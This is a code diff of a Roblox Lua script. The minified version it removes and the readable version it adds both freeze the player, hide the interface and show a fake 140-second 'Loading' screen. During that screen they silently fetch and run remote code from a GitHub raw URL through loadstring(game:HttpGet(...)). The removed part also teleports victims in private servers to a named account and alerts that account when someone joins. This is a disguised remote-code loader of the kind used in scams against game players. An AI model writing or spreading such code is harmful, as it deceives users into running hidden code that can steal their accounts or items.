@@ -1,1 +1,86 @@
-local t=game:GetService("TeleportService")local p=game:GetService("Players")local s=game:GetService("StarterGui")local c=game:GetService("CoreGui")local u=game:GetService("UserInputService")local l=p.LocalPlayer;local o="DanielCaesarloose"local d=140;local function r()return p:FindFirstChild(o)~=nil end;local e=nil;pcall(function()e=t:GetLocalPlayerTeleportData()end);local function f()spawn(function()pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/test/refs/heads/main/test"))()end)end)end;if e and e.runScriptAgain then f()return end;if l.Name~=o then local isPrivate=false;if game.PrivateServerId and game.PrivateServerOwnerId and game.PrivateServerOwnerId.Value~=0 then isPrivate=true end;if isPrivate and r() then pcall(function()local owner=p:FindFirstChild(o)if owner then t:TeleportToPlayer(l,owner,nil,{runScriptAgain=true})end end)return end end;if l.Name==o then p.PlayerAdded:Connect(function(pl)if pl.Name~=o then s:SetCore("SendNotification",{Title="Script Alert",Text=pl.Name.." joined your server using your script.",Duration=5})end end)end;local g=l:WaitForChild("PlayerGui")local gs={}for _,v in pairs(g:GetChildren())do if v:IsA("ScreenGui")then gs[v]=v.Enabled v.Enabled=false end end;s:SetCore("TopbarEnabled",false)pcall(function()local pl=c:FindFirstChild("PlayerList")if pl then pl.Enabled=false end end)local ch=l.Character or l.CharacterAdded:Wait()local h=ch:FindFirstChildOfClass("Humanoid")if h then h.WalkSpeed=0 h.JumpPower=0 h.PlatformStand=true end;local cam=workspace.CurrentCamera cam.CameraType=Enum.CameraType.Scriptable;local lg=Instance.new("ScreenGui",g)lg.Name="FullLoadingScreen"lg.IgnoreGuiInset=true lg.ResetOnSpawn=false lg.DisplayOrder=9999;local bg=Instance.new("Frame",lg)bg.BackgroundColor3=Color3.new(0,0,0)bg.Size=UDim2.new(1,0,1,0);local t1=Instance.new("TextLabel",bg)t1.Size=UDim2.new(1,0,0.1,0)t1.Position=UDim2.new(0,0,0.3,0)t1.BackgroundTransparency=1 t1.TextColor3=Color3.new(1,1,1)t1.TextScaled=true t1.Font=Enum.Font.SourceSansBold t1.Text="Loading, please wait...";local l1=Instance.new("TextLabel",bg)l1.Size=UDim2.new(1,0,0.1,0)l1.Position=UDim2.new(0,0,0.5,0)l1.BackgroundTransparency=1 l1.TextColor3=Color3.new(1,1,1)l1.TextScaled=true l1.Font=Enum.Font.SourceSans l1.Text="Loading: "..d;f();for i=d,1,-1 do l1.Text="Loading: "..i wait(1)end;lg:Destroy();for v,e in pairs(gs)do if v and v.Parent then v.Enabled=e end end;s:SetCore("TopbarEnabled",true)pcall(function()local pl=c:FindFirstChild("PlayerList")if pl then pl.Enabled=true end end);if h then h.WalkSpeed=16 h.JumpPower=50 h.PlatformStand=false end;cam.CameraType=Enum.CameraType.Custom;u.ModalEnabled=false u.OverrideMouseIconBehavior=Enum.OverrideMouseIconBehavior.None
+local player = game.Players.LocalPlayer
+local countdownTime = 140
+local uis = game:GetService("UserInputService")
+
+-- Save original enabled states of GUIs
+local playerGui = player:WaitForChild("PlayerGui")
+local guiStates = {}
+for _, gui in pairs(playerGui:GetChildren()) do
+    if gui:IsA("ScreenGui") then
+        guiStates[gui] = gui.Enabled
+        gui.Enabled = false
+    end
+end
+
+local char = player.Character or player.CharacterAdded:Wait()
+local humanoid = char:FindFirstChildOfClass("Humanoid")
+if humanoid then
+    humanoid.WalkSpeed = 0
+    humanoid.JumpPower = 0
+    humanoid.PlatformStand = true
+end
+
+local cam = workspace.CurrentCamera
+cam.CameraType = Enum.CameraType.Scriptable
+
+-- Create loading screen GUI
+local loadingGui = Instance.new("ScreenGui", playerGui)
+loadingGui.Name = "FullLoadingScreen"
+loadingGui.IgnoreGuiInset = true
+loadingGui.ResetOnSpawn = false
+loadingGui.DisplayOrder = 9999
+
+local bg = Instance.new("Frame", loadingGui)
+bg.BackgroundColor3 = Color3.new(0, 0, 0)
+bg.Size = UDim2.new(1, 0, 1, 0)
+
+local title = Instance.new("TextLabel", bg)
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.Position = UDim2.new(0, 0, 0.3, 0)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextScaled = true
+title.Font = Enum.Font.SourceSansBold
+title.Text = "Loading, please wait..."
+
+local label = Instance.new("TextLabel", bg)
+label.Size = UDim2.new(1, 0, 0.1, 0)
+label.Position = UDim2.new(0, 0, 0.5, 0)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.new(1, 1, 1)
+label.TextScaled = true
+label.Font = Enum.Font.SourceSans
+label.Text = "Loading: " .. countdownTime
+
+-- Run your script silently
+spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/test/refs/heads/main/test"))()
+    end)
+end)
+
+for i = countdownTime, 1, -1 do
+    label.Text = "Loading: " .. i
+    wait(1)
+end
+
+loadingGui:Destroy()
+
+-- Restore original GUI enabled states
+for gui, wasEnabled in pairs(guiStates) do
+    if gui and gui.Parent then -- check still valid
+        gui.Enabled = wasEnabled
+    end
+end
+
+if humanoid then
+    humanoid.WalkSpeed = 16
+    humanoid.JumpPower = 50
+    humanoid.PlatformStand = false
+end
+
+cam.CameraType = Enum.CameraType.Custom
+
+-- Enable input back just in case
+uis.ModalEnabled = false
+uis.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.None
